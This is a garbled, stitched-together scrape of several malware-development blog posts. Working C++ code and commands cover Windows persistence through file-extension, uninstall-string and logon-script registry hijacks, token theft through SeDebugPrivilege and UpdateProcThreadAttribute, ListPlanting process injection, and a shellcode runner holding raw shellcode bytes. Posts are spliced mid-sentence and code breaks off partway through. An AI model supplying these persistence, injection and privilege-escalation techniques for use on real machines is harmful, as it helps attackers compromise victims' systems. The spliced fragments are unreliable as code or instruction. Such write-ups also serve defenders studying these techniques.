      "title": "Malware development: persistence - part 9. Default file extension hijacking. Simple C++ example.",
      "ref": "2022-08-26-malware-pers-9",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!\n\n    \n\nThis article is the result of my own research into one of the interesting malware persistence trick: hijacking default file extension.    \n\n### default file association     \n\nFor example, when a `.txt` file is double-clicked, `notepad.exe` is used to open it.     \n\n    \n\nWindows knows that it must use `notepad.exe` to access `.txt` files because the `.txt` extension (and many others) are mapped to applications that can open such files in the registry: `HKEY_CLASSES_ROOT`.\n\nIt is possible to hijacking a default file association to execute a malicious program.     \n\n### practical example    \n\nLet's go to hijack `.txt`. In this case, the `.txt` extension handler is specified in the registry key listed below:     \n\n`HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command`    \n\nRun command:    \n\n```powershell\nreg query \"HKCR\\txtfile\\shell\\open\\command\" /s\n```\n\n    \n\nThen, create our \"malicious\" application:     \n\n```cpp\n/*\nhack.cpp\nevil app for windows persistence via\nhijacking default file extension\nauthor: @cocomelonc\nhttps://cocomelonc.github.io/malware/2022/08/26/malware-pers-9.html\n*/\n#include \n#pragma comment (lib, \"user32.lib\")\n\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n  MessageBox(NULL, \"Meow-meow!\", \"=^..^=\", MB_OK);\n  return 0;\n}\n```\n\nAs you can see, the logic is pretty simple as usually: just pop-up `meow-meow` messagebox.    \n\nAt the next step, hijack the `.txt` file extension by modifying the value data of `\\HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command` by this script:     \n\n```cpp\n/*\npers.cpp\nwindows persistence via\nhijacking default file extension\nauthor: @cocomelonc\nhttps://cocomelonc.github.io/malware/2022/08/26/malware-pers-9.html\n*/\n#include \n#include \n#include \n#include \n\nint main(int argc, char* argv[]) {\n  HKEY hkey = NULL;\n\n  // command for replace\n  // \"%SystemRoot%\\\\system32\\\\NOTEPAD.EXE %1\"\n  // malicious app\n  const char* cmd = \"Z:\\\\2022-08-26-malware-pers-9\\\\hack.exe\";\n\n  // hijacking logic\n  LONG res = RegOpenKeyEx(HKEY_CLASSES_ROOT, (LPCSTR)\"\\\\txtfile\\\\shell\\\\open\\\\command\", 0 , KEY_WRITE, &hkey);\n  if (res == ERROR_SUCCESS) {\n    // update key\n    RegSetValueEx(hkey, (LPCSTR)\"\", 0, REG_SZ, (unsigned char*)cmd, strlen(cmd));\n    RegCloseKey(hkey);\n  }\n  return 0;\n}\n```\n\nAs you can see, in this source code we just replace `%SystemRoot%\\system32\\NOTEPAD.EXE %1` with `Z:\\2022-08-26-malware-pers-9\\hack.exe`.\n\n### demo\n\nLet's go to see everything in action. Compile our malware:    \n\n```bash\nx86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n    \n\nThe generated `hack.exe` needs to be dropped into the victim’s machine.    \n\nThen, compile the program responsible for persistence:     \n\n```bash\nx86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n    \n\nThe generated `pers.exe` also needs to be dropped into the victim’s machine.     \n\nThen just run:    \n\n```powershell\n.\\pers.exe\n```\n\n    \n\nSo, try to open `.txt` file, for example double-click `test.txt`:     \n\n    \n\n    \n\nAs you can see, the \"malware\" will be executed. Perfect! :)    \n\nThen, cleanup:    \n\n```powershell\nreg add \"HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command\" /ve /t REG_SZ /d \"%SystemRoot%\\system32\\NOTEPAD.EXE %1\"\n```\n\n    \n\nIt would be good practice to do this (in real malware) with little bit different logic so that the victim user will still be able to open the original `.txt` file, but he will additionally run the malicious activity.     \n\nThis persistence trick is used by [SILENTTRINITY](https://attack.mitre.org/software/S0692/) framework and [Kimsuky](https://attack.mitre.org/groups/G0094/) cyber espionage group. This malware was used in a 2019 campaign against Croatian government agencies by unidentified cyber actors.       \n\nI hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal.    \n\n[MITRE ATT&CK: Change Default File Association](https://attack.mitre.org/techniques/T1546/001/)     \n[SILENTTRINITY](https://attack.mitre.org/software/S0692/)     \n[Kimsuky](https://attack.mitre.org/groups/G0094/)      \n[source code on Github](https://github.com/cocomelonc/meow/tree/master/2022-08-26-malware-pers-9)       \n\n> This is a practical case for educational purposes only.      \n\nThanks for your time happy hacking and good bye!   \n*PS. This allows the debugger/application to run concurrently with the application being debugged.    \n\nHow to set this feature? We can launch a process/program when another application silently exits.    \n\n*Silent exit* for an application means the application has been terminated in one of two ways:\n1. Self termination by calling `ExitProcess`\n2. Another process terminates the monitored process by calling `TerminateProcess`\n\nThis is configurable via the following registry key:    \n\n`HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit`        \n\n### practical example\n\nLet's go to run our malware once Microsoft Paint (`mspaint.exe`) is silently exiting.     \n\nSo, let's say we have our return 0;\n}\n```\n\nAs you can see, as usually, I use \"meow-meow\" message box \"malware\" =^..^=    \n\nThen, create persistence script for modify registry (`pers.cpp`): = \"Z:\\\\2022-09-10-malware-pers-10\\\\hack.exe\";\n\n  // GlobalFlag\n  // LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\mspaint.exe\", 0 , KEY_WRITE, &hkey);\n  LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, A logon session is used to indicate a user's presence on a computer: it begins when a user is successfully authenticated and ends when the user logs off.    \n\n   \n\nOnce the user has been authenticated successfully, the [Local Security Authority (LSA)](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) will generate a new login session and an access token.    \n\nEvery new logon session is distinguished by a `64-bit` locally unique identifier (`LUID`), also known as the logon ID, and every access token must include an Authentication Id (or `AuthId`) parameter that identifies the origin/linked logon session using this `LUID`.    \n\nThe primary purpose of an access token is to serve as a \"volatile store for security settings connected with the login session\" that may be dynamically updated. In this sense, when making security decisions, Windows developers interact with the access token that represents the login session (which is \"hidden\" in lsass)\n\nTherefore, a developer may duplicate existing tokens via `DuplicateTokenEx`:     \n\n```cpp\nBOOL DuplicateTokenEx(\n  HANDLE                       hExistingToken,\n  DWORD                        dwDesiredAccess,\n  LPSECURITY_ATTRIBUTES        lpTokenAttributes,\n  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,\n  TOKEN_TYPE                   TokenType,\n  PHANDLE                      phNewToken\n);\n```\n, calling thread impersonate the security context of a logged-on user via `ImpersonateLoggedOnUser`:\n\n```cpp\nBOOL ImpersonateLoggedOnUser(\n  HANDLE hToken\n);\n```\n\netc.    \n\nA token also contains a logon `SID`(Security Identifier) that identifies the current logon session.\n\nThe type of system actions that a user account may conduct is determined by their [privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). User and group rights are assigned by an administrator. Each user's rights consist of those provided to both the user and the groups to which the user belongs.     \n\nThe access token routines that retrieve and modify privileges utilize the locally unique identifier (`LUID`) type to identify privileges.\nWe can use the `LookupPrivilegeValue` function to determine the `LUID` for a privilege constant on the local system:      \n\n```cpp\nBOOL LookupPrivilegeValueA(\n  LPCSTR lpSystemName,\n  LPCSTR lpName,\n  [PLUID  lpLuid\n);\n```\n\nYou can see all this info via command:    \n\n```powershell\nwhoami /all\n```\n\n    \n\nor using [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer):    \n\n    \n\nThere are two types of access tokens:\n\n- Primary (sometimes called Delegate)\n- Impersonation\n\nWhen a user logs into a Windows Domain, **primary tokens** are produced. This may be accomplished by physically accessing a Windows computer or remotely through Remote Desktop.    \n\nTypically, **impersonation tokens** do something in a different security context than the process that initiated them. For mounting network shares or domain logon scripts, these non-interactive tokens are utilized.        \n\n### local administrator\n\nLet's go to open two command prompts, one with administrator privileges:\n\n    \n\none without:    \n\n    \n\nand compare via Process Explorer:     \n\n    \n\nAs you can see, when we run `cmd.exe` with Administrator privileges the `BUILTIN\\Administrators` flag is set to `Owner`. You can retrieve a handle to any process in the system by enabling the `SeDebugPrivilege` in the calling process. The calling process can then call the `OpenProcess()` Win32 API to obtain a handle with `PROCESS_ALL_ACCESS`, `PROCESS_QUERY_INFORMATION`, or `PROCESS_QUERY_LIMITED_INFORMATION`.      \n\n### technique. practical example\n\nCreating a new process using a \"stolen\" token from another process is one of the strategies of token manipulation.\nThis occurs when a token of an existing access token present in one of the active processes on the target host is extracted, duplicated, and then used to create a new process, so granting the new process the privileges of the stolen token.\n\nThe following is an overview of the token theft procedure that will be carried out in this practical case:     \n\n    \n\nFirst of all, sometimes you do have `SeDebugPrivilege` in your current set of privileges, but it is disabled, so you must turn it on:    \n\n```cpp\n// set privilege\nBOOL setPrivilege(LPCTSTR priv) {\n  HANDLE token;\n  TOKEN_PRIVILEGES tp;\n  LUID luid;\n  BOOL res = TRUE;\n\n  tp.PrivilegeCount = 1;\n  tp.Privileges[0].Luid = luid;\n  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n  if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;\n  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;\n  if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;\n  printf(res ? \"successfully enable %s :)\\n\" : \"failed to enable %s :(\\n\", priv);\n  return res;\n}\n```\n\nThen, open a process whose access token you wish to steal and obtain a handle to that process's access token:     \n\n```cpp\n// get access token\nHAN"

They are in the registry keys:    \n\n`HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\`    \n\nand  \n\n`HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\QuietUninstallString\\`     \n\nSo what is the trick? There is no problem with replacing them with commands that can run any other program. When a user executes the uninstaller, the command of the attacker's choosing is executed. Again, the good news is that privileges are required to modify these items, as they reside under the `HKLM` key.     \n\n### practical example\n\nLet's look at a practical example. Firstly, let's choose a target application. I chose `7-zip x64`:    \n\n    \n\n    \n\n    \n\nThen, check registry key values, for correctness:    \n\n```powershell\nreg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\7-zip\" /s\n```\n\n    \n\nAlso, I prepared my evil application. It's as usually `meow-meow` \"malware\" :)    \n\n    \n\nThen, I create a program, which do my logic for persistence (`pers.cpp`):    \n\n```cpp\n/*\npers.cpp\nwindows persistence via\nhijacking uninstall app\nauthor: @cocomelonc\nhttps://cocomelonc.github.io/malware/2022/10/04/malware-pers-13.html\n*/\n#include \n#include \n\nint main(int argc, char* argv[]) {\n  HKEY hkey = NULL;\n\n  // target app\n  const char* app = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\7-zip\";\n\n  // evil app\n  const char* exe = \"C:\\\\Users\\\\User\\\\Documents\\\\malware\\\\2022-10-04-malware-pers-13\\\\hack.exe\";\n\n  // app\n  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)app, 0 , KEY_WRITE, &hkey);\n  if (res == ERROR_SUCCESS) {\n    // update registry key value\n    // reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\7-zip\" /v \"UninstallString\" /t REG_SZ /d \"...\\hack.exe\" /f\n    RegSetValueEx(hkey, (LPCSTR)\"UninstallString\", 0, REG_SZ, (unsigned char*)exe, strlen(exe));\n    RegSetValueEx(hkey, (LPCSTR)\"QuietUninstallString\", 0, REG_SZ, (unsigned char*)exe, strlen(exe));\n    RegCloseKey(hkey);\n  }\n\n  return 0;\n}\n```\n\nAs you can see, the logic is simple, we are just update target key values in registry.    \n\n### demo\n\nLet's go to see everything in action. Compile malware and persistence script:    \n\n```bash\nx86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n    \n\nAnd run at the victim's machine - `Windows 10 x64` in my case:    \n\n```powershell\n.\\pers.exe\n```\n\n    \n\nFinally, after reboot my system, tried to uninstall `7-zip`:    \n\n    \n\n    \n\n    \n\n    \n\nThen I looked at the properties of `hack.exe` in Process Hacker 2:    \n\n    \n\nas you can see the parent process is `SystemSettings.exe` - is what you see whenever you open your Windows settings. In our case, it is `add/remove programs`. Perfect! =^..^=    \n\nThere are the little caveat. When I try to update key with path `Z:\\2022-10-04-malware-pers-13\\hack.exe` I get an error like this:    \n\n    \n\nMaybe you can use only paths inside the disk `C:\\`.    \n\nAfter end of the experiments, clean up:    \n\n```powershell\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\7-zip\" /v \"UninstallString\" /t REG_SZ /d \"C:\\Program Files\\7-zip\\Uninstall.exe\" /f\n```\n\n    \n\n### conclusion\n\nOf course, maybe this trick is not so cool for persistence, since it requires the permissions and participation of the victim's user.       "title": "APT techniques: Token theft via UpdateProcThreadAttribute. Simple C++ example.",
      "ref": "2022-10-28-token-theft-2",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!     \n\n    \n\nThis post is the result of my own research into one of the more interesting APT techniques: token theft via UpdateProcThreadAttribute.     \n\nIn the previous [post](/tutorial/2022/09/25/token-theft-1.html) I wrote about classic token theft via `DuplicateTokenEx` and `CreateProcessWithTokenW`. Today I will describe an alternative method that works starting from Windows Vista.     \n\n### UpdateProcThreadAttribute\n\nIn the first part of my tutorial, we just doing classic trick: enable `SE_DEBUG_PRIVILEGE`, open a token from any system process (which works even for protected processes also), duplicate the token, adjust privileges on it, and then impersonate with this token.     \n\nToday we can use more simply trick. Microsoft implemented in Vista the ability to designate an explicit parent process when creating a new process, allowing the elevated process to remain a child of the caller.\n\nTypically, in the UAC instance, you must issue an explicit token to the new process. If you do not supply a token, the new process will inherit from the designated parent. The only condition is that the handle to the parent process must have the `PROCESS_CREATE_PROCESS` access privilege.     \n\nSo, we just open some system process with `PROCESS_CREATE_PROCESS` access right. Then use this handle with `UpdateProcThreadAttribute`. In consequence, your process inherits a token from the system process.     \n\n```cpp\nBOOL UpdateProcThreadAttribute(\n  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,\n  DWORD                        dwFlags,\n  DWORD_PTR                    Attribute,\n  PVOID                        lpValue,\n  SIZE_T                       cbSize,\n  PVOID                        lpPreviousValue,\n  PSIZE_T                      lpReturnSize\n);\n```\n\nAnd all you need for working this is `SE_DEBUG_PRIVILEGE`.    \n\n### technique. practical example\n\nFirst of all, sometimes you must turn on `SeDebugPrivilege` in your current set of privileges:     \n\n```cpp\n// set privilege\nBOOL setPrivilege(LPCTSTR priv) {\n  HANDLE token;\n  TOKEN_PRIVILEGES tp;\n  LUID luid;\n  BOOL res = TRUE;\n\n  tp.PrivilegeCount = 1;\n  tp.Privileges[0].Luid = luid;\n  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n  if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;\n  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;\n  if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;\n  printf(res ? \"successfully enable %s :)\\n\" : \"failed to enable %s :(\\n\", priv);\n  return res;\n}\n```\n\nThen, open a process whose access token you wish to steal with `PROCESS_CREATE_PROCESS` access rights:    \n\n```cpp\nHANDLE ph = OpenProcess(PROCESS_CREATE_PROCESS, false, pid);\n```\n\nAfter that, use it is handle with `UpdateProcThreadAttribute`:    \n\n```cpp\nZeroMemory(&si, sizeof(STARTUPINFOEXW));\nZeroMemory(&pi, sizeof(PROCESS_INFORMATION));\nInitializeProcThreadAttributeList(NULL, 1, 0, &size);\nsi.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(\n  GetProcessHeap(),\n  0,\n  size\n);\nInitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);\nUpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ph, sizeof(HANDLE), NULL, NULL);\nsi.StartupInfo.cb = sizeof(STARTUPINFOEXW);\n```\n\nFinally, create process:     \n\n```cpp\nres = CreateProcessW(app, NULL, NULL, NULL, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);\nprintf(res ? How to use it for malware analysis in practice.   \n\n###  entropy\n\nSimply said, Shannon entropy is the quantity of information included inside a message, in communication terminology. Entropy is a measure of the unpredictability of the file's data. The Shannon entropy is named after the famous mathematician Shannon Claude.     \n\n### entropy and malwares\n\nNow let me unfold a relationship between malwares and entropy. Malware authors are clever and advance and they do many tactics and tricks to hide malware from AV engines. As you know from my previous posts, it's usually something like [payload encryption](/tutorial/2021/09/04/simple-malware-av-evasion.html) or [function call obfuscation](/tutorial/2021/09/06/simple-malware-av-evasion-2.html). But at the same time as author is compressing the data as well as inserting some harmful code in the original file author is lowering the unpredictability of data therefore raising the entropy and here we can catch the file based on the entropy value. So, the greater the entropy, the more likely the data is obfuscated or encrypted, and the more probable the file is malicious.       \n\n### practical examples\n\nSo how do you calculate Shannon's entropy?     \n\n    \n\nwhich can represent as:    \n\n    \n\ni.e.\n\n    \n\nis a well known identity of the logarithm.     \n\n means \"The entropy of data X.\".       \n\nThe right hand of formula represents a summation that sums up:    \n\n    \n\nThis is the most important part of the equation, because this is what assigns higher numbers to rarer events and lower numbers to common events.  represents the proportion of each unique character  in the input .     \n\nIn the Python language it is looks like this:       \n\n```python\nimport math\n\ndef shannon_entropy(data):\n    # 256 different possible values\n    possible = dict(((chr(x), 0) for x in range(0, 256)))\n\n    for byte in data:\n        possible[chr(byte)] +=1\n\n    data_len = len(data)\n    entropy = 0.0\n\n    # compute\n    for i in possible:\n        if possible[i] == 0:\n            continue\n\n        p = float(possible[i] / data_len)\n        entropy -= p * math.log(p, 2)\n    return entropy\n```\n\nLet's go to create script which calculate Shannon entropy of PE file's sections. Let's start with a simpler problem.       "title": "Malware development tricks: part 24. Listplanting. C++ example.",

      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!\n\n    \n\nThis post is the result of my own research into the malware dev trick: Listplanting.     \n\nUsing the `LVM_SORTGROUPS`, `LVM_INSERTGROUPSORTED`, and `LVM_SORTITEMS` messages, a `ListView` control's items and groups can have their sorting behavior modified to suit individual preferences. List-view controls are user interface windows that display groups of things. A `SysListView32` control stores information about an application's list-view settings in the process' memory.    \n\n*ListPlanting* may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.    \n\n### practical example\n\nLet's go to look at a practical example. The trick is pretty simple:    \n\nFirst of all, get windows handle:\n\n```cpp\nHWND wpw = FindWindow(NULL, (LPCSTR)\"Registry Editor\");\nHWND hw = FindWindowEx(wpw, 0, (LPCSTR)\"SysListView32\", 0);\n```\n\nThen, get process ID, and open it (get process handle by `OpenProcess`):   \n\n```cpp\nGetWindowThreadProcessId(hw, &pid);\nph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n```\n\nAt the next step, we allocate RWX-memory via `VirtualAllocEx` and \"copy\" payload:     \n\n```cpp\nmem = VirtualAllocEx(ph, NULL, sizeof(my_payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n// copy payload\nWriteProcessMemory(ph, mem, my_payload, sizeof(my_payload), NULL);\n```\n\nFinally, trigger payload:    \n\n```cpp\n// trigger payload\nPostMessage(hw, LVM_SORTITEMS, 0, (LPARAM)mem);\n```\n\nAccording to [documentation](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-postmessagea), `PostMessage` - Places (posts) a message in the message queue associated with the thread that created the specified window and returns without waiting for the thread to process the message.      \n\nThe full source code of my PoC:      \n\n```cpp\n/*\nhack.cpp\ncode injection Listplanting\nauthor: @cocomelonc\nhttps://cocomelonc.github.io/malware/2022/11/27/malware-tricks-24.html\n*/\n#include \n#include \n#include \n#pragma comment       "title": "Malware development: persistence - part 20. UserInitMprLogonScript (Logon Script). Simple C++ example.",
      "ref": "2022-12-09-malware-pers-20",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!     \n\n    \n\nThis post is based on my own research into one of the more interesting malware persistence tricks: via `UserInitMprLogonScript` value.     \n\n### UserInitMprLogonScript\n\nWindows enables the execution of logon scripts whenever a user or group of users logs into a system. Adding a script's path to the `HKCU\\Environment\\UserInitMprLogonScript` Registry key accomplishes this. So, to establish persistence, hackers may utilize Windows logon scripts automatically executed upon logon initialization.      \n\n### practical example\n\nLet's go to look at a practical example. First of all, as usually, create \"evil\" application. For simplicity, as usually, it's `meow-meow` messagebox application (`hack.cpp`):  \n\n```cpp\n/*\nhack.cpp\nevil app for windows persistence\nauthor: @cocomelonc\nhttps://cocomelonc.github.io/malware/2022/12/09/malware-pers-20.html\n*/\n#include \n#pragma comment (lib, \"user32.lib\")\n\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n  MessageBox(NULL, \"Meow-meow!\", \"=^..^=\", MB_OK);\n  return 0;\n}\n```\n\nAnd, then just create persistence script (`pers.cpp`):      \n\n```cpp\n/*\npers.cpp\nwindows persistence via\nsetting UserInitMprLogonScript value\nauthor: @cocomelonc\nhttps://cocomelonc.github.io/malware/2022/12/09/malware-pers-20.html\n*/\n#include \n#include \n\nint main(int argc, char* argv[]) {\n  HKEY hkey = NULL;\n\n  // env\n  const char* env = \"Environment\";\n\n  // evil app\n  const char* exe = \"Z:\\\\2022-12-09-malware-pers-20\\\\hack.exe\";\n\n  // environment\n  LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)env, 0 , KEY_WRITE, &hkey);\n  if (res == ERROR_SUCCESS) {\n    // update registry key value\n    // reg add \"HKEY_CURRENT_USER\\Environment\" /v \"UserInitMprLogonScript\" /t REG_SZ /d \"...\\hack.exe\" /f\n    RegSetValueEx(hkey, (LPCSTR)\"UserInitMprLogonScript\", 0, REG_SZ, (unsigned char*)exe, strlen(exe));\n    RegCloseKey(hkey);\n  }\n\n  return 0;\n}\n```\n\nAs you can see, the logic is simple. Just set `UserInitMprLogonScript` key value under `HKCU\\Environment` to the full path of our \"malware\" - `Z:\\\\2022-12-09-malware-pers-20\\hack.exe`.     \n\n### demo\n\nLet's go to see everything in action. First of all, check Registry:      \n\n```powershell\nreg query \"HKCU\\Environment\" /s\n```\n\n    \n\nThen, compile our \"malware\" at the attacker's machine (`kali`):    \n\n```bash\nx86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n    \n\nAnd for checking correctness, try to run `hack.exe` at the victim's machine (`Windows 10 x64` in my case):    \n\n```powershell\n.\\hack.exe\n```\n\n    \n\nAs you can see, our \"malware\" works perfectly.    \n\nAt the next step, let's go to compile our persistence script at the attacker's machine:    \n\n```bash\nx86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n    \n\nAnd run it at the attacker's machine:    \n\n```powershell\n.\\pers.exe\n```\n\nThen, check our Registry key values again:    \n\n```powershell\nreg query \"HKCU\\Environment\" /s\n```\n\n    \n\nSo, as you can see, the key (`UserInitMprLogonScript`) value is set.    \n\nThat's all. For example, Windows Explorer - `explorer.exe`. Parent process is `userinit.exe` or `winlogon.exe`, but can be anything `.exe` using `explorer.exe`. Parent will show as `` since `userinit.exe` terminates itself. Another example is Windows Logon - `winlogon.exe`. Parent is \"does not exist\" since `smss.exe` exits.      \n\nIf we check `hack.exe` properties via [Sysinternals Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer), we can see \"Autostart Location\" value:    \n\n    \n\nEverything is worked perfectly! =^..^=\n\nAfter the end of experiment, delete the key:    \n\n```powershell\nRemove-ItemProperty -Path \"HKCU:\\Environment\" -Name \"UserInitMprLogonScript\"\n```\n\n    \n\nThis persistence trick is used by [APT28](https://attack.mitre.org/groups/G0007) group and software like [Attor](https://attack.mitre.org/software/S0438) and [Zebrocy](https://attack.mitre.org/software/S0438) at the wild.    \n\nI hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal.      \n\n> This is a practical case for educational purposes only.      \n\n[Sysinternals Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)        \n[Malware persistence: part 1](/tutorial/2022/04/20/malware-pers-1.html)       \n[APT28](https://attack.mitre.org/groups/G0007)      \n[Attor](https://attack.mitre.org/software/S0438)        \n[Zebrocy (Trojan)](https://attack.mitre.org/software/S0438)       \n[source code in github](https://github.com/cocomelonc/meow/tree/master/2022-12-09-malware-pers-20)     \n\nThanks for your time happy hacking and good bye!   \n*PS. Using this API, the list of loaded modules can be dumped for debugging purposes during the development of error handler frameworks, crash dumps, etc:     \n\n```cpp\nBOOL IMAGEAPI EnumerateLoadedModules(\n  [in]           HANDLE                       hProcess,\n  [in]           PENUMLOADED_MODULES_CALLBACK EnumLoadedModulesCallback,\n  [in, optional] PVOID                        UserContext\n);\n```\n\nFor calling `EnumerateLoadedModules` we need to provide a callback pointer. The `EnumerateLoadedModules` will send the loaded module information as callback to that provided function.\n\n### practical example 1. print modules\n\nFor example, first of all create simplest callback function:    \n\n```cpp\nBOOL CALLBACK PrintModules(\n  PSTR ModuleName,\n  ULONG ModuleBase,\n  ULONG ModuleSize,\n  PVOID UserContext) {\n    // print the module name.\n    printf(\"%s\\n\", ModuleName);\n    return TRUE;\n}\n```\n\nThen, just use this function as a second argument:    \n\n```cpp\nEnumerateLoadedModules(ph, (PENUMLOADED_MODULES_CALLBACK)PrintModules, NULL);\n```\n\nSo, full code is something like this:    \n\n```cpp\n#include \n#include \n#include \n\n#pragma comment (lib, \"dbghelp.lib\")\n\n// callback function\nBOOL CALLBACK PrintModules(\n  PSTR ModuleName,\n  ULONG ModuleBase,\n  ULONG ModuleSize,\n  PVOID UserContext) {\n    // print the module name.\n    printf(\"%s\\n\", ModuleName);\n    return TRUE;\n}\n\nint main(int argc, char *argv[]) {\n  // inject a DLL into remote process\n  HANDLE ph = GetCurrentProcess();\n  // enumerate modules\n  printf(\"\\nenumerate modules... \\n\");\n  EnumerateLoadedModules(ph, (PENUMLOADED_MODULES_CALLBACK)PrintModules, NULL);\n  return 0;\n}\n```\n\n### demo 1\n\nLet's go to see first example in action. Compile our script `hack.cpp`:    \n\n```bash\nx86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -ldbghelp\n```\n\n    \n\nThen, just run on Windows machine (`Windows 10 x64` in our case): To do this, according to the [MSDN documentation](https://learn.microsoft.com/en-us/dotnet/standard/threading/mutexes), we can use mutexes.\n\n### mutex\n\nFor simplicity, we can use `CreateMutexA` function from Windows API:    \n\n```cpp\nHANDLE CreateMutexA(\n  LPSECURITY_ATTRIBUTES lpMutexAttributes,\n  BOOL                  bInitialOwner,\n  LPCSTR                lpName\n);\n```\n\n### practical example\n\nIn the simplest implementation, you can use this function in this way:    \n\ncreate mutex with specific name, so multiple instances can detect it:    \n\n```cpp\nhMutex = CreateMutexA(NULL, FALSE, \"MeowMeowMutex\");\n```\n\ncheck if mutex already exists, exit from app:    \n\n```cpp\nif (GetLastError() == ERROR_ALREADY_EXISTS) {\n  // if this process created the mutex, exit the application\n  if (hMutex && GetLastError() == ERROR_ALREADY_EXISTS) {\n    CloseHandle(hMutex);\n    return 0;\n  }\n}\n```\n\notherwise, run malicious logic and close the mutex when done:    \n\n```cpp\n\n//...\n// malicious logic\nLPVOID mem = VirtualAlloc(NULL, sizeof(my_payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nRtlMoveMemory(mem, my_payload, sizeof(my_payload));\nEnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);\n\n//...\n\n// cleanup\nif (hMutex)\n  CloseHandle(hMutex);\nreturn 0;\n```\n\nSo, full source code is looks like:    \n\n```cpp\n/*\n * hack.cpp - Create mutex, run shellcode. \"\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\"\n  \"\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\"\n  